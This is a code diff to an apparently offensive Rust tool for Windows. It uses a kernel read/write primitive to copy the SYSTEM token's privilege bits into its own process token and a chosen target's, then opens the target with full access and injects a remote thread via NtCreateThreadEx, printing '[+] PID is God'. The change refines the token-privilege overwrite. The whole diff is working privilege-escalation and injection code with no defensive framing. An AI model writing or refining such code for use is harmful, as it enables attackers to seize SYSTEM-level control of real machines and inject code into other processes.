@@ -174,11 +174,11 @@ fn walk_eprocess(
     })
 }
 
-fn escalate_eproc(krw: &KernelRW, eproc: u64) -> Result<()> {
+fn escalate_eproc(krw: &KernelRW, eproc: u64, sys_present: u64) -> Result<()> {
     let token_ref = krw.kread(eproc + EPROC_TOKEN)?;
     let token = token_ref & !0xF;
-    krw.kwrite(token + TOKEN_SEP_PRESENT, 0xFFFF_FFFF_FFFF_FFFF)?;
-    krw.kwrite(token + TOKEN_SEP_ENABLED, 0xFFFF_FFFF_FFFF_FFFF)?;
+    krw.kwrite(token + TOKEN_SEP_PRESENT, sys_present)?;
+    krw.kwrite(token + TOKEN_SEP_ENABLED, sys_present)?;
     Ok(())
 }
 
@@ -235,8 +235,12 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
     };
     log_debug(&format!("Selected target process for injection: PID={}", final_pid));
 
+    let sys_token_ref = krw.kread(system_eproc + EPROC_TOKEN)?;
+    let sys_token = sys_token_ref & !0xF;
+    let sys_present = krw.kread(sys_token + TOKEN_SEP_PRESENT)?;
+
     log_debug("Escalating privileges...");
-    escalate_eproc(&krw, walk.our_eproc)?;
+    escalate_eproc(&krw, walk.our_eproc, sys_present)?;
     log_debug("Privileges escalated successfully.");
 
     let hproc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, final_pid as u32) };
@@ -307,7 +311,7 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
     if st != 0 { bail!("NtCreateThreadEx failed: {st:x}"); }
     log_debug(&format!("NtCreateThreadEx success: thread handle {:?}", hthread));
 
-    escalate_eproc(&krw, target_eproc)?;
+    escalate_eproc(&krw, target_eproc, sys_present)?;
     println!("[+] PID {} is God", final_pid);
 
     unsafe { CloseHandle(hthread); }
